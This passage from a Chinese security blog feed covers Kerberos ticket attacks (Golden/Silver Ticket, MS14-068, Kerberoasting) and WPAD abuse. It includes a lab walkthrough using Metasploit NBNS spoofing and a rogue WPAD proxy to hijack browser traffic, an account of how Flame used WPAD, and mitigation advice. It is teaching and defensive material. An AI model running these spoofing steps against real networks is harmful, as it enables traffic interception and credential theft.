保管，另一把由 KDC 把自己的密码 hash 成 <strong>KKdc</strong>，然后用它加密另一把委托给 A 的密钥，把这个委托的密钥称为 <strong>TGT（Ticket Granting Ticket）</strong>，TGT = {账户 A 的信息, Kclt-kdc}，返回 <strong>AS_REP</strong> = TGT, {Kclt-kdc, 时间戳, 随机字符串}Kclt。</p><p>账号 A 收到 AS_REP 后利用 Kclt 解密信息，通过解开随机字符串和时间戳来确定 KDC 的真实性，然后把 Kclt-kdc 和 TGT 保存起来备用。</p><p>2）账号 A 请求 KDC 认证资源 B</p><p>首先 A 将 TGT 交还给 KDC，其次还有账号 A 的相关信息，当前时间戳，以及要访问的资源 B 的信息，生成 <strong>TGS-REQ</strong>。</p><p>KDC 收到 TGS-REQ 后，先用 Kkdc 解密 TGT 得到 Kclt-kdc，再用 Kclt-kdc 解密出账号 A 的相关信息和时间戳来验证其身份。一旦确认账号A为真，就可以帮助 A 和 B 完成互相认证了。</p><p>KDC 生成两把同样的密钥 <strong>Kclt-srv</strong> 供 A 和 B 之间使用，其中一把密钥直接交给 A，另一把委托 A 交给 B。为了确保 A 不会受到假的资源 B 欺骗，Kerberos 把 B 的密码 hash 成 <strong>Ksrv</strong>，然后用它加密那把委托 A 交给 B 的 Kclt-srv ，成为一张只有真正的 B 能解开的 <strong>Ticket</strong>，Ticket = {账户 A 的信息, Kclt-srv}Ksrv，返回 <strong>TGS-REP</strong> = {Kclt-srv}Kclt-kdc, Ticket。</p><p>账号 A 收到 TGS-REP 后，先用 Kclt-kdc 解开 {Kclt-srv}Kclt-kdc，得到 Kclt-srv，再将 Ticket 保留着发给资源B。接下来如果需要多次访问资源 B，<strong>都可以使用同一个 Ticket，而不需要每次都向 KDC 申请</strong>。</p><p>3）账号 A 和资源 B 互相认证</p><p>账号 A 给资源 B 发送 <strong>CS-REQ</strong> = {账号A的信息，时间戳}Kclt-srv, Ticket。如果资源 B 为真，则可以使用自己的 Ksrv 解开 Ticket，得到 Kclt-srv，从而可以解开 {账号A的信息，时间戳}Kclt-srv，这样资源 B 就可以确定账户 A 为真，然后回复 <strong>CS-REP</strong> = {时间戳}Kclt-srv，来证明自己也是真的。账号 A 解密 CS-REP，再通过时间戳来判断对方是否为真。</p><p>更详细的过程可参考《Wireshark网络分析就这么简单》中 Kerberos 的相关章节，作者的解释十分通俗易懂。</p><h3 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h3><p><strong>Pass the Ticket（PTT）</strong>是利用 Kerberos 协议进行的 Ticket 传递攻击，有三种常见的利用方法：MS14-068，Golden Ticket 和 Silver Ticket。</p><h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h4><p>MS14-068 是 Windows 密钥分发中心（KDC）服务中的一个严重漏洞，其影响全部版本 Windows 版本的服务器，该漏洞允许攻击者提升任意普通域用户成为域管理员账户，攻击者可以利用这些提升的权限控制域中所有的计算机，包括域服务器。</p><p>漏洞的主要成因是由于 KDC 允许经过身份验证的用户在其 Kerberos 票证（TGT）中插入任意 PAC，当用户进行登录身份验证时，KDC 会验证 PAC 中的签名，并使用 PAC 中的数据为用户创建一个登录令牌，而 KDC 服务器端的 PAC signature 时没有严格控制使用 checksum 算法，导致客户端可以提交伪造的 PAC 欺骗 KDC 获取任意票证。</p><p>关于 MS14-068 漏洞的详细分析可以看这篇文章：<a href="https://www.freebuf.com/vuls/56081.html">深入解读 MS14-068 漏洞：微软精心策划的后门？</a></p><h4 id="黄金票据（Golden-Ticket）"><a href="#黄金票据（Golden-Ticket）" class="headerlink" title="黄金票据（Golden Ticket）"></a>黄金票据（Golden Ticket）</h4><p>该票据的利用条件是原先已成功取得 KDC（<strong>krbtgt</strong> 用户）的密码 hash（即 KKdc），并且还有一个普通域用户权限，在此条件下，我们可以利用 krbtgt 的 hash 值伪造生成任意用户的 TGT，绕过账号策略，让用户成为任意组的成员，还能利用该票据重新获得域管理员权限。</p><blockquote><p>因为 krbtgt 只有域控制器上才有，使用黄金凭据意味着你之前拿到过域控制器的权限，所以可以理解为是一个后门。</p></blockquote><h4 id="白银票据（Silver-Ticket）"><a href="#白银票据（Silver-Ticket）" class="headerlink" title="白银票据（Silver Ticket）"></a>白银票据（Silver Ticket）</h4><p>通过分析 Kerberos 协议的认证过程不难发现，如果我们获取了 Server B 的秘钥 Ksrv，就可以跳过 KDC 的认证，直接伪造票据与 Server 通信。</p><p>Silver Ticket 和 Golden Ticket 不同的是，它不需要和域控制器进行通信，原理是伪造 TGS 服务器，使用计算机账户的 hash 进行加密，所以只能对单一的服务进行授权，访问指定的权限。而 Golden Ticket 的利用过程需要访问域控，原理是伪造 TGT，由 Kerberos 的 hash 进行加密，可以获取任何 Kerberos 服务权限。</p><h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><p>2014年 SANS HackFest 大会上 Tim Medin 提出了一种新的攻击 Kerberos 的技术，他称之为 “Kerberoasting”。Tim 给出的利用方法是使用工具集的组合来请求票证，并从内存中提取票证，然后将它们转换为可破解的格式。更详细的技术细节，可以见 Tim 的 PPT 或 <a href="https://adsecurity.org/?p=2293">Cracking Kerberos TGS Tickets Using Kerberoast</a>。</p><h2 id="0x05-相关利用工具"><a href="#0x05-相关利用工具" class="headerlink" title="0x05 相关利用工具"></a>0x05 相关利用工具</h2><ul><li><a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>：PTH、PTK、PTT 攻击，提取 Windows 明文密码、hash 值等凭据。</li><li><a href="https://github.com/PowerShellMafia/PowerSploit">PowerView</a>：PowerSploit 框架和 Empire 的一部分，用于内网信息搜集。</li><li><a href="https://github.com/Kevin-Robertson/Invoke-TheHash">wmiexec</a>：Windows WMIC 的强化版，可用于 PTH 攻击。</li><li><a href="https://github.com/nidem/kerberoast">Kerberoast</a>：Kerberoasting 利用工具包。</li><li><a href="https://github.com/SpiderLabs/Responder">Responder</a>：劫持 LLMNR 和 NBT-NS 请求，获取 Net-NTLM Hash。</li></ul><p><strong>参考文章：</strong><br><a href="https://2018.zeronights.ru/wp-content/uploads/materials/08-Ntlm-Relay-Reloaded-Attack-methods-you-do-not-know.pdf">腾讯安全玄武实验室 NTLM Relay Reloaded Attack methods you do not know.pdf</a><br><a href="https://xz.aliyun.com/t/2445">https://xz.aliyun.com/t/2445</a><br><a href="http://www.tiejiang.org/23508.html">http://www.tiejiang.org/23508.html</a><br><a href="http://xnianq.cn/2018/10/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">http://xnianq.cn/2018/10/16/%E5%9F%9F%E6%B8%97%E9%80%8F%E4%B9%8B%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/</a><br><a href="https://www.cnblogs.com/bmjoker/p/10355979.html#autoid-0-0-0">https://www.cnblogs.com/bmjoker/p/10355979.html#autoid-0-0-0</a><br><a href="https://www.4hou.com/technology/16263.html">https://www.4hou.com/technology/16263.html</a><br><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/">https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>身份认证</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>域控</tag>
      
      <tag>NTLM</tag>
      
      <tag>Kerberos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>WPAD 协议分析及内网渗透利用</title>
    <link href="/post/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/"/>
    <url>/post/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>本文将会阐述 WPAD 协议的工作原理、实现方式以及在内网渗透中的应用思路。</p><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>WPAD 这项技术已经诞生了近十年的时间，其最大的优势就在于在一个或多个局域网中，当需要为内网中的用户设置不同的代理服务器去连接互联网或者企业内网时，利用  WPAD 就能够灵活方便的进行配置。由于配置代理服务器的方式对于用户来说是透明的，因此，攻击者就容易利用 WPAD 进行内网的渗透。</p><p>可能是由于常规的内网渗透，如 Windows 域的渗透中，攻击者只需拿到域控的权限即可控制域中的任何机器，所以攻击者往往只关注如何抓到域管理员的 Hash，而即使在工作组的渗透中，也有着比 WPAD 更有效的攻击方式。因此，虽然利用 WPAD 进行内网渗透的技术已经出现了很多年了，但一直没有变得像 ARP Spoof 等攻击方式那么流行。但是在攻击者“无计可施”的时候，也会采用一些“非主流”的方式进行内网渗透，WPAD 可能造成的安全隐患，不容我们忽视。</p><h2 id="0x01-WPAD-简介"><a href="#0x01-WPAD-简介" class="headerlink" title="0x01 WPAD 简介"></a>0x01 WPAD 简介</h2><p><strong>WPAD（Web Proxy Auto-Discovery Protocol，网络代理自动发现协议）</strong>，可以使局域网中用户的浏览器自动发现内网中的代理服务器，并使用已发现的代理服务器连接互联网或者企业内网。WPAD 支持所有主流的浏览器，从 IE 5.0 开始就已经支持了代理服务器自动发现/切换的功能，而苹果公司考虑到 WPAD 的安全风险，在包括 OSX 10.10 及之后版本的操作系统中的 Safari 浏览器将不再支持 PAC 文件的解析。</p><blockquote><p>注：默认情况下，在所有 Windows 操作系统和 IE 浏览器上都启用了 WPAD，而 Mac OS X 和 Linux 操作系统，以及 Safari、Chrome 和 Firefox 等浏览器，虽然支持 WPAD，但默认情况下不会启用。</p></blockquote><h3 id="WPAD-工作原理"><a href="#WPAD-工作原理" class="headerlink" title="WPAD 工作原理"></a>WPAD 工作原理</h3><p>当系统开启了代理自动发现功能后，用户使用浏览器上网时，浏览器就会在当前局域网中自动查找可以加载 PAC 文件的服务器，之后下载 PAC 配置文件（通过 80 端口），并执行特定的 JavaScript 脚本将相应的代理服务器设置到用户的浏览器中。</p><p><strong>WPAD 查询步骤如下：</strong></p><ul><li>如果 DHCP 服务器配置了 wpad，那么直接从 DHCP 服务器获取 wpad.dat 文件，如果成功则下载 wpad.dat 文件并配置，否则执行下一步；</li><li>向 DNS 服务器发送请求查找 wpad.test.local，然后获取代理配置文件，如果成功下载 wpad.dat 文件并配置，否则执行下一步；</li><li>发送 LLMNR 查询 wpad.test.local，如果成功则下载 wpad.dat 文件并配置，否则代理设置失败。</li></ul><h3 id="PAC-文件"><a href="#PAC-文件" class="headerlink" title="PAC 文件"></a>PAC 文件</h3><p><strong>PAC（Proxy Auto-Config，代理自动配置文件）</strong>，定义了浏览器和其他用户代理在访问一个 URL 时所应该使用的代理服务器（完成自动选择），使用 <strong>Javascript</strong> 进行 URL 和代理服务器的描述。通常使用 <strong>proxy.pac</strong> 作为文件名，WPAD 标准则要求使用 <strong>wpad.dat</strong> 作为 PAC 文件的文件名。</p><blockquote><p>要使用 PAC，则应当在网页服务器上发布一个 PAC 文件，并且通过浏览器的代理链接设置页面输入这个 PAC 文件的 URL 或者使用 WPAD 协议告知用户代理去使用这个文件。</p></blockquote><p>一个 PAC 文件至少定义了一个名为 <strong>FindProxyForURL(url, host)</strong> 的 JavaScript 函数，该函数的返回值是一个字符串，指定了 URL 的访问方式，两个参数分别代表了要指定设置的 URL 和 该 URL 所对应的主机名。</p><p>PAC 文件内容示例如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">FindProxyForURL</span>(<span class="hljs-params">url, host</span>) </span>&#123;<br>   <span class="hljs-keyword">if</span> (url== <span class="hljs-string">&#x27;http://example.org/&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;DIRECT&#x27;</span>;<br>   <span class="hljs-keyword">if</span> (shExpMatch(host, <span class="hljs-string">&quot;*.wooyun.org&quot;</span>)) <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;DIRECT&quot;</span>;<br>   <span class="hljs-keyword">if</span> (host== <span class="hljs-string">&#x27;wooyun.com&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;SOCKS 127.1.1.1:8080&#x27;</span>;<br>   <span class="hljs-keyword">if</span> (dnsResolve(host) == <span class="hljs-string">&#x27;10.0.0.100&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;PROXY 127.2.2.2:8080;DIRECT&#x27;</span>;<br>   <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;DIRECT&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>该文件定义了当用户访问 <a href="http://example.org/">http://example.org</a> 时，将不使用任何代理服务器直接（DIRECT）访问 URL。也可以使用 <strong>shExpMatch</strong> 函数对 host 或者 url 进行匹配设置，<strong>SOCKS 127.1.1.1:8080</strong> 指定了使用 127.1.1.1:8080 的 SOCKS 代理进行 URL 的访问，<strong>PROXY 127.2.2.2:8080;DIRECT</strong> 指定了使用 127.2.2.2:8080 的 HTTP 代理进行 URL 的访问，如果连接 127.2.2.2:8080 的 HTTP 代理服务器失败，则直接（DIRECT）访问 URL。</p><blockquote><p>注：FF 和 IE 只支持系统默认的编码类型的 PAC 文件，并且不支持 Unicode 编码，如 UTF-8。</p></blockquote><h2 id="0x02-Windows-中的-WPAD"><a href="#0x02-Windows-中的-WPAD" class="headerlink" title="0x02 Windows 中的 WPAD"></a>0x02 Windows 中的 WPAD</h2><h3 id="IE-浏览器中默认开启-WPAD"><a href="#IE-浏览器中默认开启-WPAD" class="headerlink" title="IE 浏览器中默认开启 WPAD"></a>IE 浏览器中默认开启 WPAD</h3><p>在 Windows 系统中，从 IE 5.0 开始就支持了 WPAD，并且是默认开启 WPAD 功能的，如下图所示：</p><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/20171207135000-76d44886-db12-1.png" alt="Windows 中 IE 浏览器的 WPAD 设置"></p><p>另外，Windows 系统从 IE 5.5 开始支持“自动代理结果缓存”功能，并默认设置为开启。因为每次客户端浏览器成功连接 HTTP 代理服务器时都会更新 ARP 缓存，开启此功能后，当客户端浏览器再次连接代理服务器，即再次调用 FindProxyForURL() 函数时，会先检查 ARP 缓存列表中是否存在要连接的 HTTP 代理服务器地址，再选择是否需要代理，以缩减系统获取分配对象的开销。</p><h3 id="WinHTTP-的-WPAD-支持"><a href="#WinHTTP-的-WPAD-支持" class="headerlink" title="WinHTTP 的 WPAD 支持"></a>WinHTTP 的 WPAD 支持</h3><p>在 Windows 系统中，有一个服务名为 <strong>WinHTTP Web Proxy Auto-Discovery Service</strong>，其描述信息为  “WinHTTP 实现了客户端 HTTP 堆栈并向开发人员提供 Win32 API 和 COM 自动化组件以供发送 HTTP 请求和接收响应。此外，通过执行 Web 代理自动发现（WPAD）协议，WinHTTP 还提供对自动发现代理服务器配置的支持。”，如图所示：</p><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/1562741625870.png" alt="Windows 中的 WinHttpAutoProxySvc 服务"></p><p><strong>出于安全性考虑，建议禁用。</strong></p><blockquote><p>注：WPAD 并不是 IE 浏览器的功能，而是属于WinHTTP 库中的功能，有一个单独的 WinHttpAutoProxySvc 服务。WinHTTP 是Windows系统下提供 autoproxy 服务的独立的网络库，专门为提供 HTTP/HTTPS 服务的。<br>网上很多文章说，防止 WPAD 攻击就是禁用浏览器的 WPAD，这个方法只能说治标不治本。单单禁用浏览器的 WPAD 功能只能保证浏览器的访问数据没法通过 WPAD 劫持了，但是这种禁用方式不会影响 WinHTTP 的功能。在 WIN 系统下，处理 HTTP 的请求基本都用 WinHTTP 的库，如果其他程序使用 WinHTTP，WPAD 照样还是可以攻击。</p></blockquote><h2 id="0x03-WPAD-实现方式"><a href="#0x03-WPAD-实现方式" class="headerlink" title="0x03 WPAD 实现方式"></a>0x03 WPAD 实现方式</h2><p>WPAD 通过让浏览器自动发现代理服务器，使代理服务器对用户来说是透明的，进而轻松访问互联网。WPAD 可以借助 DHCP 服务器、DNS 服务器和 WINS 服务器，来查询代理自动配置（PAC）文件的位置，如图所示：</p><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/1562809252340.png" alt="WPAD 查询 PAC 文件的方式"></p><h3 id="使用-DHCP-配置-WPAD"><a href="#使用-DHCP-配置-WPAD" class="headerlink" title="使用 DHCP 配置 WPAD"></a>使用 DHCP 配置 WPAD</h3><p><strong>DHCP（Dynamic Host Configuration Protocol，动态主机配置协议）</strong>，是一个用于局域网的网络管理协议，可以为进入网络的任何新节点进行动态分配，主要功能是分配 IP 地址，此外还包含一些其他信息，如子网掩码、 WPAD 等，这些额外的信息都是通过 DHCP 协议中的 <strong>Options</strong> 字段传输的。</p><p>DHCP 的工作流程有 4 个步骤：</p><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/20171207135039-8e14982a-db12-1.png" alt="DHCP 工作流程"></p><p>上图即为客户端与 DHCP 服务器进行交互的过程。其中前两个流程主要是客户端发送广播包，DHCP  服务器进行响应并客户端进行单播通讯，后面的两个流程即为客户端从 DHCP 服务器获取 IP 地址的过程。</p><p>当使用 DHCP 服务器配置 WPAD 时，DHCP 协议将会有所改变，增加了 <strong>DHCPINFORM</strong> 消息（具体的改变可以在 <a href="https://tools.ietf.org/html/rfc2131">RFC 2131</a> 中看到），用于客户端请求本地配置参数。所以客户端在请求 WPAD 主机时就会发送 DHCPINFORM 请求消息，查询 PAC 文件位置；之后 DHCP 服务器会应答 DHCPINFORM 请求，返回 DHCPACK 确认消息，此消息中的 DHCP Options 字段里包含的 DHCP <strong>252</strong> 选项即为 WPAD 代理服务器的 PAC 文件地址。</p><blockquote><p>注：在目前的大多数内网中已经不再使用 DHCP 服务器进行客户端 WPAD 的配置了，而是采用较为简单的 DNS 服务器进行配置，关于 DHCP Options  的其他定义可以查看 DHCP 的 <a href="https://tools.ietf.org/html/rfc1531">RFC 1531</a>。</p></blockquote><h3 id="利用-DNS-配置-WPAD"><a href="#利用-DNS-配置-WPAD" class="headerlink" title="利用 DNS 配置 WPAD"></a>利用 DNS 配置 WPAD</h3><p>利用 DNS 配置 WPAD 的方式本质上还是利用了 Windows 系统的名称解析机制，其过程如下：</p><ul><li><p>如果客户端主机是处于域环境下时，客户端主机向 DNS 服务器发起的 WPAD+X 的查询请求为 <strong>“WPAD.当前域的域名”</strong>，DNS 服务器对 WPAD 主机的名称进行解析返回 WPAD 主机的 IP 地址，客户端 Web 浏览器通过 WPAD 主机的 IP 的 80 端口下载并解析 PAC 文件；</p></li><li><p>如果客户端主机是在工作组环境中，客户端主机向 DNS 服务器发起的 WPAD+X 的查询时，则会遵循 Windows 系统的名称解析顺序，查询请求的名称均为 <strong>“WPAD”</strong>，OS 版本为 Vista 之后的（包括 Vista）顺序为：DNS =&gt; LLMNR =&gt; NBNS，反之则为 DNS =&gt; NBNS。</p></li></ul><h3 id="通过-NBNS-配置-WPAD"><a href="#通过-NBNS-配置-WPAD" class="headerlink" title="通过 NBNS 配置 WPAD"></a>通过 NBNS 配置 WPAD</h3><p>如果 <strong>DHCP 服务器和 DNS 服务器均没有响应</strong>，同时当前缓存没有所请求的主机名，就会发起如下名称解析：</p><ul><li><p>如果当前系统支持 LLMNR，先发起 LLMNR 广播查询；</p></li><li><p>如果没有响应，再发起 NBNS 广播查询；</p></li><li><p>如果有主机回应 PAC 文件位置，Web 浏览器通过该 IP 的 80 端口下载 wpad.dat文件。</p></li></ul><blockquote><p>注：Windows 2K，XP，2K3 只支持 DNS 和 NetBIOS<br>Windows Vista 之后（包括 2K8，Win7，Win8.x，Win 10）支持DNS、NetBIOS、LLMNR</p></blockquote><h2 id="0x04-使用-MSF-进行-WPAD-内网渗透"><a href="#0x04-使用-MSF-进行-WPAD-内网渗透" class="headerlink" title="0x04 使用 MSF 进行 WPAD 内网渗透"></a>0x04 使用 MSF 进行 WPAD 内网渗透</h2><p>对照 WPAD 的原理，不难发现其中存在漏洞，可以利用 Windows 系统名称解析机制的缺陷，进行 WPAD 的“恶意”配置，从而进行内网的渗透。一种常见的利用方式是在被攻击用户发起 NBNS 查询时伪造 NBNS 响应，那么就可以控制其通过伪造的代理服务器上网，达到会话劫持的目的，如下图所示：</p><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/2019-08-06_161644.png" alt="利用 WPAD 进行内网渗透"></p><p><strong>使用 MSF 对以上过程进行测试，进行 WPAD 内网渗透：</strong></p><ul><li><p><strong>测试环境：</strong></p><ul><li><p>被攻击用户：</p><p>Windows 7、192.168.16.191</p></li><li><p>攻击用户：</p><p>Kali Linux、192.168.16.245</p></li></ul></li></ul><p><strong>1. 监听 NBNS 查询请求</strong></p><blockquote><p>use auxiliary/spoof/nbns/nbns_response<br>set regex WPAD<br>set spoofip 192.168.16.245<br>run</p></blockquote><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/2019-08-06_155506.png" alt="监听 NBNS 查询请求"></p><p><strong>2. 伪造 WPAD 服务器</strong></p><blockquote><p>use auxiliary/server/wpad<br>set proxy 192.168.16.245<br>run</p></blockquote><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/2019-08-06_155507.png" alt="伪造 WPAD 服务器"></p><p><strong>3. 伪造被攻击用户发起查询</strong></p><p>构造广播 NBNS 查询，前提是需要使当前 DHCP 和 DNS 服务器均无法提供的 PAC 文件位置。</p><blockquote><p>注：关闭上述服务器后浏览器访问任意网页即可。</p></blockquote><p><strong>4. 响应被攻击用户的广播 NBNS 查询</strong></p><p>攻击主机响应广播 NBNS 查询并指定 PAC 文件位置，被攻击主机访问指定的 PAC 位置请求下载。</p><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/2019-08-06_155508.png" alt="攻击者发起恶意响应"></p><p><strong>5. 使用 Burp 配置代理服务器</strong></p><p>配置 Burp 代理 IP 为 192.168.253.131:8080，使受害者通过攻击者的代理服务器访问互联网。</p><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/2019-08-06_155552.png" alt="配置 Burp 代理服务器"></p><p><strong>6. 被攻击用户使用伪造的代理配置上网</strong></p><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/2019-08-06_155627.png" alt="受害者通过代理访问网页"></p><p><img src="/img/WPAD%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90%E5%8F%8A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%88%A9%E7%94%A8/2019-08-06_155646.png" alt="查看受害者主机 NetBIOS缓存"></p><h2 id="0x05-WPAD-内网渗透深入研究"><a href="#0x05-WPAD-内网渗透深入研究" class="headerlink" title="0x05 WPAD 内网渗透深入研究"></a>0x05 WPAD 内网渗透深入研究</h2><ul><li><p>利用 NetBIOS 名称解析进行基于 WPAD 的中间人攻击</p><p>见 <em>利用 NBNS 协议缺陷进行 WPAD 中间人攻击</em></p></li><li><p>利用 LLLMNR 名称解析缺陷进行基于 WPAD 的中间人攻击</p><p>见 <em>利用 LLMNR 名称解析缺陷劫持内网指定主机会话</em></p></li><li><p>利用 DHCP 本地网络进行基于 WPAD 的中间人攻击</p><p>在本地网络中，攻击者可以通过 ARP 欺骗等方式伪装成 DHCP 服务器，然后在 DHCP 响应包的 DHCP 252 选项中提供一个恶意 PAC 文件所在的 URL。</p></li><li><p>通过特权地位（privileged position）和 DNS 进行远程攻击</p><p>除了本地网络攻击外，WPAD 攻击也可能通过外部 DNS 查询发生。由于许多用户将他们的计算机配置了公共的 DNS 服务器（如 8.8.8.8、8.8.4.4、208.67.222.222 和 208.67.220.220）来执行 DNS 域名解析，在这种情况下，用户机器会发送 DNS 查询（如 wpad.local）到本地网络之外的服务器，处于网络特权位置的攻击者（例如网关或任何其他上游主机）可以监视 DNS 查询并伪造应答，从而指示客户端下载并执行恶意的 PAC 文件。</p></li><li><p>通过恶意的 wpad.tld 远程访问 Internet</p><p>WPAD 的特殊之处在于会递归地遍历本地机器名称以查找要查询的域，如果一台机器被称为“laptop01.us.division.company.com”，则按照以下方式查询以下域名：</p><blockquote><ol><li>wpad.us.division.company.com</li><li>wpad.division.company.com</li><li>wpad.company.com</li><li>wpad.com</li></ol></blockquote><p>利用这个漏洞，攻击者可以通过恶意的 wpad.tld 域名，将用户的浏览器指向自己的代理，拦截并修改所有的 HTTP 流量。</p></li></ul><h2 id="0x06-威胁实例-——-Flame-病毒"><a href="#0x06-威胁实例-——-Flame-病毒" class="headerlink" title="0x06 威胁实例 —— Flame 病毒"></a>0x06 威胁实例 —— Flame 病毒</h2><p><strong>超级火焰（Flame）病毒利用 WPAD 进行中间人攻击</strong>，其工作模式如下：</p><ul><li><p><strong>SNACK：NetBIOS 名称服务器欺骗（NBNS spoofing）</strong></p><p>SNACK 模块会为所有网络接口或预设网络接口创建一个 RAW 网络套接字，并监听当前网络接收所有的网络数据包，如果收到了 NBNS 查询会将其写入加密的日志文件中（“%windir%\temp~DEB93D.tmp”），当 NBNS 查询请求中包含<strong>“WPAD”</strong>或<strong>“MSHOME-F3BE293C”</strong> 字符，立即伪造 NBNS 响应，返回自己的 IP 地址。</p></li><li><p><strong>MUNCH：代理检测欺骗和 Windows 更新请求欺骗（Spoofing proxy detection and Windows Update request）</strong></p><p>“MUNCH”是 FlameHTTP 服务器模块的名称，用于提供 WPAD 服务，它会收到来自受感染计算机中的 SNACK 提供的 IP 地址，并通过由 MUNCH 提供的 “wpad.dat” 文件将受感染计算机用作代理服务器。当其成功作为被攻击主机的代理后，会劫持特定的 Windows 更新请求到 MUNCH 服务器，并提供带有后门的 Windows 更新文件给受害者下载。</p></li></ul><h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>在利用 WPAD 进行攻击时，实际的效果很可能没有想象的那么好，不过一旦奏效，就可以拿到受害者主机权限。在很多内网中，管理员不会对这些攻击方式做防御措施，除了部分桌面安全产品，如防火墙可能会做严格的过滤拦截，大部分情况下，此类攻击方式还是很有效的。尤其是可以在做名称解析响应时，可以筛选受害者主机，对  HTTP 数据包进行更改插入恶意代码，进行针对性的定点打击。</p><h3 id="预防和修复"><a href="#预防和修复" class="headerlink" title="预防和修复"></a>预防和修复</h3><p>对于 WPAD 攻击，<strong>唯一</strong> 能够阻止这类漏洞的方法就是完全禁用 WinHttpAutoProxySvc 服务。有时由于其他服务依赖 WPAD，所以在“服务”设置中无法禁用它（选项变灰），但可以通过修改相应的注册表项来完成：</p><blockquote><p>在注册表 “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinHttpAutoProxySvc” 位置下，将 “Start” 的值从3（手动）更改为4（禁用）。</p></blockquote><p><strong>参考文章：</strong><br><a href="https://xz.aliyun.com/t/1739">https://xz.aliyun.com/t/1739</a><br><a href="https://www.cnblogs.com/studyskill/p/8532566.html">https://www.cnblogs.com/studyskill/p/8532566.html</a><br><a href="https://blog.csdn.net/zy_strive_2012/article/details/53196482">https://blog.csdn.net/zy_strive_2012/article/details/53196482</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WPAD</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>利用 NBNS 协议缺陷进行 WPAD 中间人攻击</title>
    <link href="/post/%E5%88%A9%E7%94%A8NBNS%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8CWPAD%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    <url>/post/%E5%88%A9%E7%94%A8NBNS%E5%8D%8F%E8%AE%AE%E7%BC%BA%E9%99%B7%E8%BF%9B%E8%A1%8CWPAD%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
    
